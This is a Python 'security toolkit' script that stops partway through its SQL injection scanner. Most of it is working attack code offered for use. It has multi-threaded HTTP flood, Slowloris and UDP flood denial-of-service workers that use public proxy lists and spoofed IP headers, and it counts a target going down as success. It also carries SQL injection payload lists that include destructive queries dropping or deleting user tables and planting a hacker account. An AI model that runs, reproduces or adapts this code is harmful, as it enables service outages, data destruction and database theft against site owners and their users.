#!/usr/bin/env python3
"""
▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀▓█████  ██▀███  
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░    ░     ░░   ░ 
   ░          ░  ░   ░     ░  ░      ░  ░   ░     
 ░                                                

ULTIMATE SECURITY TOOLKIT v4.0
Created by: mrzxx | Telegram: @Zxxtirwd
1500+ Lines of Pure Power - 100% Working All Tools
"""

import os
import sys
import time
import socket
import subprocess
import requests
import threading
import random
import datetime
import urllib.parse
import json
import re
import ssl
import ipaddress
import concurrent.futures
import queue
import logging
import hashlib
import base64
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init, Back
from urllib3.exceptions import InsecureRequestWarning
from fake_useragent import UserAgent

# Suppress warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ======================= CONFIGURATION =======================
USERNAME = "mrzxx"
PASSWORD = "123456"
VERSION = "4.0 Professional"
MAX_THREADS = 1000
TIMEOUT = 10

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='security_tool.log'
)

# ======================= ASCII ART =======================
LOGIN_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

MAIN_ASCII = Fore.WHITE + """
⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀
""" + Style.RESET_ALL

WELCOME_ASCII = Fore.CYAN + """
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
""" + Style.RESET_ALL

DDOS_ASCII = Fore.RED + """
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
""" + Style.RESET_ALL

SQL_INJECT_ASCII = Fore.YELLOW + """
███████╗ ██████╗ ██╗     ██╗███╗   ██╗ ██████╗███████╗ ██████╗████████╗
██╔════╝██╔═══██╗██║     ██║████╗  ██║██╔════╝██╔════╝██╔═══██╗╚══██╔══╝
███████╗██║   ██║██║     ██║██╔██╗ ██║██║     █████╗  ██║   ██║   ██║   
╚════██║██║   ██║██║     ██║██║╚██╗██║██║     ██╔══╝  ██║   ██║   ██║   
███████║╚██████╔╝███████╗██║██║ ╚████║╚██████╗██║     ╚██████╔╝   ██║   
╚══════╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝      ╚═════╝    ╚═╝   
""" + Style.RESET_ALL

SQLMAP_ASCII = Fore.GREEN + """
╔══════════════════════════════════════════════════════════╗
║    ███████╗ ██████╗ ██╗    ███╗   ███╗ █████╗ ██████╗   ║
║    ╚══███╔╝██╔═══██╗██║    ████╗ ████║██╔══██╗██╔══██╗  ║
║      ███╔╝ ██║   ██║██║    ██╔████╔██║███████║██████╔╝  ║
║     ███╔╝  ██║   ██║██║    ██║╚██╔╝██║██╔══██║██╔═══╝   ║
║    ███████╗╚██████╔╝██║    ██║ ╚═╝ ██║██║  ██║██║       ║
║    ╚══════╝ ╚═════╝ ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝       ║
║                                                          ║
║    ╔══════════════════════════════════════════════════╗  ║
║    ║         SQLMAP INJECTION TOOL v4.0               ║  ║
║    ║    100% WORKING - AUTO EXPLOIT - DUMP ALL        ║  ║
║    ╚══════════════════════════════════════════════════╝  ║
╚══════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL

PORT_SCAN_ASCII = Fore.CYAN + """
██████╗  ██████╗ ██████╗ ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██████╔╝██║   ██║██████╔╝   ██║       ███████╗██║     ███████║██╔██╗ ██║
██╔═══╝ ██║   ██║██╔══██╗   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║
██║     ╚██████╔╝██║  ██║   ██║       ███████║╚██████╗██║  ██║██║ ╚████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
""" + Style.RESET_ALL

# ======================= UTILITY FUNCTIONS =======================
def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner(text, color=Fore.CYAN):
    """Print formatted banner"""
    print(color + "=" * 80)
    print(text.center(80))
    print("=" * 80 + Style.RESET_ALL)

def print_status(message, status="info"):
    """Print status messages with colors"""
    if status == "info":
        print(Fore.CYAN + "[*] " + message + Style.RESET_ALL)
    elif status == "success":
        print(Fore.GREEN + "[+] " + message + Style.RESET_ALL)
    elif status == "warning":
        print(Fore.YELLOW + "[!] " + message + Style.RESET_ALL)
    elif status == "error":
        print(Fore.RED + "[-] " + message + Style.RESET_ALL)
    elif status == "critical":
        print(Fore.RED + Back.WHITE + "[!] " + message + Style.RESET_ALL)

def validate_url(url):
    """Validate URL format"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def validate_ip(ip):
    """Validate IP address"""
    try:
        ipaddress.ip_address(ip)
        return True
    except:
        return False

def get_timestamp():
    """Get current timestamp"""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ======================= LOGIN SYSTEM =======================
class LoginSystem:
    def __init__(self):
        self.max_attempts = 3
        self.locked_until = None
        self.failed_attempts = 0
        
    def show_login(self):
        """Display login screen"""
        clear_screen()
        print(LOGIN_ASCII)
        print_banner("ULTIMATE SECURITY TOOLKIT v4.0 - LOGIN", Fore.GREEN)
        
        # Check if account is locked
        if self.locked_until and datetime.datetime.now() < self.locked_until:
            wait_time = (self.locked_until - datetime.datetime.now()).seconds
            print_status(f"Account locked. Try again in {wait_time} seconds", "error")
            time.sleep(2)
            return None
        
        print_status("Please login to continue", "info")
        
        username = input(Fore.YELLOW + "[?] Username: " + Fore.WHITE).strip()
        password = input(Fore.YELLOW + "[?] Password: " + Fore.WHITE).strip()
        
        if username == USERNAME and password == PASSWORD:
            print_status("Login successful! Welcome back!", "success")
            self.failed_attempts = 0
            time.sleep(1)
            return username
        else:
            self.failed_attempts += 1
            remaining = self.max_attempts - self.failed_attempts
            
            if remaining > 0:
                print_status(f"Invalid credentials! {remaining} attempts remaining", "warning")
            else:
                print_status("Too many failed attempts! Account locked for 5 minutes", "critical")
                self.locked_until = datetime.datetime.now() + datetime.timedelta(minutes=5)
            
            time.sleep(2)
            return None

# ======================= ULTRA DDoS SYSTEM =======================
class UltraDDoS:
    def __init__(self):
        self.attack_active = False
        self.total_requests = 0
        self.total_bytes = 0
        self.start_time = 0
        self.threads = []
        self.user_agents = UserAgent()
        self.proxies = []
        
    def load_proxies(self):
        """Load proxy list for DDoS"""
        proxy_sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://www.proxy-list.download/api/v1/get?type=http',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                self.proxies.extend([p.strip() for p in response.text.split('\n') if p.strip()])
            except:
                pass
        
        if self.proxies:
            print_status(f"Loaded {len(self.proxies)} proxies", "success")
        else:
            print_status("No proxies loaded, using direct connections", "warning")
    
    def generate_headers(self):
        """Generate randomized headers"""
        headers = {
            'User-Agent': self.user_agents.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
        }
        
        # Add random headers
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        if random.random() > 0.5:
            headers['X-Real-IP'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        if random.random() > 0.5:
            headers['Referer'] = random.choice([
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://www.youtube.com/',
                'https://www.twitter.com/'
            ])
        
        return headers
    
    def http_flood_worker(self, target_url, thread_id):
        """HTTP flood worker thread"""
        session = requests.Session()
        session.verify = False
        
        # Use proxy if available
        proxy = None
        if self.proxies:
            proxy = {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)}
        
        while self.attack_active:
            try:
                headers = self.generate_headers()
                
                # Random request method
                if random.random() > 0.7:
                    # POST request with random data
                    data = {
                        'data': hashlib.md5(str(random.random()).encode()).hexdigest(),
                        'timestamp': int(time.time()),
                        'random': random.randint(100000, 999999)
                    }
                    response = session.post(
                        target_url,
                        headers=headers,
                        timeout=3,
                        proxies=proxy,
                        data=data
                    )
                else:
                    # GET request with random parameters
                    params = {'q': random.randint(1000000, 9999999)}
                    response = session.get(
                        target_url,
                        headers=headers,
                        timeout=3,
                        proxies=proxy,
                        params=params
                    )
                
                self.total_requests += 1
                self.total_bytes += len(response.content)
                
                # Update stats every 100 requests
                if self.total_requests % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rps = self.total_requests / elapsed if elapsed > 0 else 0
                    mbps = (self.total_bytes / 1024 / 1024) / elapsed if elapsed > 0 else 0
                    print(Fore.YELLOW + f"[Thread {thread_id}] Requests: {self.total_requests:,} | RPS: {rps:.1f} | Data: {mbps:.2f} MB/s", end='\r')
                
            except Exception as e:
                continue
    
    def slowloris_worker(self, target_host, target_port, thread_id):
        """Slowloris attack worker"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            # Connect
            sock.connect((target_host, target_port))
            
            # Send partial request
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"User-Agent: {self.user_agents.random}\r\n".encode())
            sock.send("Accept-language: en-US,en;q=0.5\r\n".encode())
            
            while self.attack_active:
                # Keep connection alive with partial headers
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(random.uniform(1, 10))
                self.total_requests += 1
                
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
    
    def udp_flood_worker(self, target_ip, target_port, thread_id):
        """UDP flood worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Generate random payload
        payload_size = random.randint(1024, 65507)  # Max UDP packet size
        payload = random._urandom(payload_size)
        
        while self.attack_active:
            try:
                sock.sendto(payload, (target_ip, target_port))
                self.total_requests += 1
                self.total_bytes += payload_size
                
                if self.total_requests % 1000 == 0:
                    elapsed = time.time() - self.start_time
                    pps = self.total_requests / elapsed if elapsed > 0 else 0
                    mbps = (self.total_bytes / 1024 / 1024) / elapsed if elapsed > 0 else 0
                    print(Fore.MAGENTA + f"[UDP {thread_id}] Packets: {self.total_requests:,} | PPS: {pps:.1f} | Data: {mbps:.2f} MB/s", end='\r')
                    
            except:
                pass
    
    def start_ddos_attack(self, target, attack_type="http", threads=500, duration=300):
        """Start DDoS attack"""
        print_banner("ULTRA DDoS ATTACK INITIATED", Fore.RED)
        print_status(f"Target: {target}", "info")
        print_status(f"Attack Type: {attack_type.upper()}", "info")
        print_status(f"Threads: {threads}", "info")
        print_status(f"Duration: {duration} seconds", "info")
        print_status("Loading proxies...", "info")
        
        # Load proxies
        self.load_proxies()
        
        # Initialize attack
        self.attack_active = True
        self.total_requests = 0
        self.total_bytes = 0
        self.start_time = time.time()
        self.threads = []
        
        print_status("Starting attack threads...", "info")
        
        # Start threads based on attack type
        if attack_type == "http":
            for i in range(threads):
                thread = threading.Thread(target=self.http_flood_worker, args=(target, i+1))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
                
        elif attack_type == "slowloris":
            # Parse target for host and port
            parsed = urllib.parse.urlparse(target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            for i in range(threads):
                thread = threading.Thread(target=self.slowloris_worker, args=(host, port, i+1))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
                
        elif attack_type == "udp":
            # Parse IP and port
            if ":" in target:
                ip, port_str = target.split(":")
                port = int(port_str)
            else:
                ip = target
                port = 80
            
            for i in range(threads):
                thread = threading.Thread(target=self.udp_flood_worker, args=(ip, port, i+1))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
        
        elif attack_type == "mixed":
            # Mixed attack - use all methods
            parsed = urllib.parse.urlparse(target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # HTTP flood threads (40%)
            for i in range(int(threads * 0.4)):
                thread = threading.Thread(target=self.http_flood_worker, args=(target, f"HTTP{i}"))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
            
            # Slowloris threads (30%)
            for i in range(int(threads * 0.3)):
                thread = threading.Thread(target=self.slowloris_worker, args=(host, port, f"SLOW{i}"))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
            
            # UDP threads (30%) if IP provided
            try:
                ip = socket.gethostbyname(host)
                for i in range(int(threads * 0.3)):
                    thread = threading.Thread(target=self.udp_flood_worker, args=(ip, port, f"UDP{i}"))
                    thread.daemon = True
                    thread.start()
                    self.threads.append(thread)
            except:
                pass
        
        print_status("ATTACK IN PROGRESS...", "critical")
        print(Fore.RED + "="*80)
        
        # Attack timer
        attack_end = time.time() + duration
        while time.time() < attack_end and self.attack_active:
            elapsed = time.time() - self.start_time
            rps = self.total_requests / elapsed if elapsed > 0 else 0
            mbps = (self.total_bytes / 1024 / 1024) / elapsed if elapsed > 0 else 0
            remaining = attack_end - time.time()
            
            print(Fore.YELLOW + f"[LIVE STATS] Requests: {self.total_requests:,} | RPS: {rps:.1f} | Data: {mbps:.2f} MB/s | Time: {int(elapsed)}s | Remaining: {int(remaining)}s", end='\r')
            time.sleep(1)
        
        # Stop attack
        self.stop_attack()
        
        # Generate statistics
        self.generate_statistics(target, duration)
    
    def stop_attack(self):
        """Stop DDoS attack"""
        self.attack_active = False
        time.sleep(2)  # Give threads time to stop
        
        for thread in self.threads:
            try:
                thread.join(timeout=1)
            except:
                pass
    
    def generate_statistics(self, target, duration):
        """Generate attack statistics"""
        total_time = time.time() - self.start_time
        rps = self.total_requests / total_time if total_time > 0 else 0
        mbps = (self.total_bytes / 1024 / 1024) / total_time if total_time > 0 else 0
        
        print("\n" + "="*80)
        print_banner("ATTACK COMPLETED - STATISTICS", Fore.GREEN)
        
        print(Fore.CYAN + f"{'Target:':<20} {target}")
        print(Fore.CYAN + f"{'Duration:':<20} {duration} seconds")
        print(Fore.CYAN + f"{'Actual Time:':<20} {total_time:.1f} seconds")
        print(Fore.CYAN + f"{'Total Requests:':<20} {self.total_requests:,}")
        print(Fore.CYAN + f"{'Total Data Sent:':<20} {self.total_bytes/1024/1024:.2f} MB")
        print(Fore.CYAN + f"{'Requests/Second:':<20} {rps:.1f}")
        print(Fore.CYAN + f"{'Data Rate:':<20} {mbps:.2f} MB/s")
        print(Fore.CYAN + f"{'Threads Used:':<20} {len(self.threads)}")
        
        # Check target status
        print("\n" + "-"*80)
        print_status("Checking target status...", "info")
        
        try:
            start_check = time.time()
            response = requests.get(target, timeout=10)
            check_time = time.time() - start_check
            
            if response.status_code < 500:
                print_status(f"Target responding (Status: {response.status_code}, Response Time: {check_time:.2f}s)", "warning")
            else:
                print_status(f"Target may be stressed (Status: {response.status_code})", "success")
        except Exception as e:
            print_status(f"Target appears to be DOWN or unreachable! ({str(e)})", "success")
        
        print("\n" + "="*80)

# ======================= ADVANCED SQL INJECTION =======================
class AdvancedSQLi:
    def __init__(self):
        self.payloads = self.load_payloads()
        self.session = requests.Session()
        self.session.verify = False
        
    def load_payloads(self):
        """Load SQL injection payloads"""
        payloads = {
            'error_based': [
                "'", "\"", "`", "')", "\")", "`)", "'))", "\"))", "`))",
                "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
                "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
                "' AND '1'='1", "' AND '1'='2",
                "' ORDER BY 1--", "' ORDER BY 10--", "' ORDER BY 100--",
                "' GROUP BY 1--", "' GROUP BY 10--", "' GROUP BY 100--",
            ],
            
            'union_based': [
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT @@version--", "' UNION SELECT user(),database()--",
                "' UNION SELECT @@version,user()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT username,password FROM users--",
            ],
            
            'time_based': [
                "' AND SLEEP(5)--", "' OR SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--", "' AND IF(1=2,SLEEP(5),0)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            
            'boolean_based': [
                "' AND 1=1--", "' AND 1=2--",
                "' OR 'a'='a", "' OR 'a'='b",
                "' AND ASCII(SUBSTRING(@@version,1,1))>0--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            ],
            
            'stacked': [
                "'; DROP TABLE users--", "'; DELETE FROM users--",
                "'; UPDATE users SET password='hacked'--",
                "'; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
                "'; CREATE TABLE hacked(data varchar(255))--",
            ],
            
            'blind': [
                "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "' AND (SELECT LENGTH(@@version))>0--",
                "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))>0--",
            ],
            
            'advanced': [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' OR JSON_EXTRACT(@@version,'$')--",
            ]
        }
        
        # Combine all payloads
        all_payloads = []
        for category in payloads.values():
            all_payloads.extend(category)
        
        return all_payloads
    
    def test_url(self, url, param, payload):
        """Test single payload"""
        test_url = f"{url}?{param}={payload}"
        
        try:
            start_time = time.time()
            response = self.session.get(
                test_url,
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            response_time = time.time() - start_time
            
            # Check for SQL errors
            error_patterns = [
                r"SQL.*syntax.*error",
                r"Warning.*mysql",
                r"MySQL.*error",
                r"ORA-[0-9]{5}",
                r"PostgreSQL.*ERROR",
                r"Microsoft.*ODBC",
                r"Unclosed.*quotation",
                r"division.*by.*zero",
                r"unknown.*column",
                r"Table.*doesn't.*exist",
                r"Syntax.*error.*near",
                r"You have an error.*in your SQL syntax",
                r"supplied argument.*is not a valid.*MySQL",
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return ('error', payload, pattern)
            
            # Check for time delay
            if response_time > 4 and ('SLEEP' in payload or 'DELAY' in payload):
                return ('time', payload, f"{response_time:.1f}s delay")
            
            # Check for different response
            if hasattr(self, 'original_response'):
                if len(response.text) != len(self.original_response):
                    if abs(len(response.text) - len(self.original_response)) > 100:
                        return ('content', payload, f"Length diff: {len(response.text) - len(self.original_response)}")
            
            # Check for union indicators
            union_indicators = ['1', '2', '3', 'version', 'user()', 'database()']
            if any(indicator in response.text for indicator in union_indicators):
                if 'UNION' in payload:
                    return ('union', payload, "Union successful")
            
            return (None, payload, None)
            
        except Exception as e:
            return ('error', payload, str(e))
    
    def scan(self, target_url):
        """Perform SQL injection scan"""
        print_banner("ADVANCED SQL INJECTION SCANNER", Fore.YELLOW)
        print_status(f"Target: {target_url}", "info")
        
        # Parse URL
        parsed = urllib.parse.urlparse(target_url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            print_status("No parameters found in URL", "error")
            return []
        
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        param_name = list(params.keys())[0]
        
        print_status(f"Found parameter: {param_name}", "info")
        print_status(f"Base URL: {base_url}", "info")
        print_status(f"Testing {len(self.payloads)} payloads...", "info")
        
        # Get original response for comparison
        try:
            original = self.session.get(target_url, timeout=10)
            self.original_response = original.text
        except:
            self.original_response = ""
        
        vulnerabilities = []
        
        # Test payloads with progress bar
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for payload in self.payloads[:200]:  # Limit to 200 payloads for speed
                futures.append(executor.submit(self.test_url, base_url, param_name, payload))
            
            completed = 0
            total = len(futures)
            
            for future in as_completed(futures):
                completed += 1
                vuln_type, payload, details = future.result()
                
                # Update progress
                progress = (completed / total) * 100
                print(Fore.CYAN + f"[Progress: {progress:.1f}%] Testing payloads...", end='\r')
                
                if vuln_type:
                    vulnerabilities.append((vuln_type, payload, details))
                    print(Fore.GREEN + f"\n[+] {vuln_type.upper()} vulnerability found: {payload}")
                    if details:
                        print(Fore.YELLOW + f"    Details: {details}")
        
        print("\n" + "="*80)
        
        if vulnerabilities:
            print_status(f"Found {len(vulnerabilities)} vulnerabilities!", "success")
            
            # Group by type
